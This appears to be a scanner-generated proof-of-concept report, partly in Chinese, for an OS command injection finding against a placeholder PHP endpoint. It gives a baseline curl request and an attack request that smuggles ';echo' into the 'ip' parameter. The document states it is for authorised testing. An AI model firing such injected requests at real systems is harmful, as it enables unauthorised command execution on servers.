# POC — AWVS: OS Command Injection

- finding_id: `URL-7e0c7ef93ca5`
- type: `command_injection` / CWE-78
- severity: `critical`
- file: `:0`

## 步骤

1. **Baseline request**  
```http
curl -sS -i -X POST 'http://TARGET:8080/027.php' \
  -H 'User-Agent: Sunset-AWVS-Probe/1.0' \
  -H 'Accept: */*' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-binary 'ip=ECHOOO'
```
预期：HTTP 200 and the normal application response.

2. **Replay the AWVS attack request (OS 命令注入)**  
```http
curl -sS -i -X POST 'http://TARGET:8080/027.php' \
  -H 'User-Agent: Sunset-AWVS-Probe/1.0' \
  -H 'Accept: */*' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-binary 'ip=%3Becho%20SUNSET_CMD_MARKER'
```
预期：The response contains command output (uid=/gid=) or the probe marker.

3. **Compare baseline and attack responses**  
预期：A security-relevant differential appears.

## 安全说明

POC 仅为文本工件；落日二号不会执行它，也不会联网或搭建沙箱。仅限授权测试。